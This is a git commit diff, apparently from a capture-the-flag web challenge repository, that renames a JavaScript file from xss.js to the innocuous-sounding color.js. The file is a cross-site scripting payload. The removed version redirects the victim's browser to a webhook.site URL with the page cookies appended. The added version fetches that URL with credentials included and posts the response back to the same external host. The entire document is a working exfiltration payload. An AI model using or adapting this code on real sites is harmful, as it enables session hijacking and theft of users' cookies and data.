45bcf919aca029f76645eca29a71dd939a7302b0
tristanqtn <tristan.querton@gmail.com>
2025-02-02 15:51:15 +0100

    aaa

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,7 +1,19 @@
-// xss.js
+// color.js
 (function () {
   alert("XSS Triggered!");
-  document.location =
-    "https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=" +
-    document.cookie;
+  fetch("https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=", {
+    method: "GET",
+    credentials: "include", // Include cookies in the request
+  }).then((response) => {
+    response.text().then((data) => {
+      // Send the response back to your server
+      fetch(
+        "https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=",
+        {
+          method: "POST",
+          body: data,
+        }
+      );
+    });
+  });
 })();
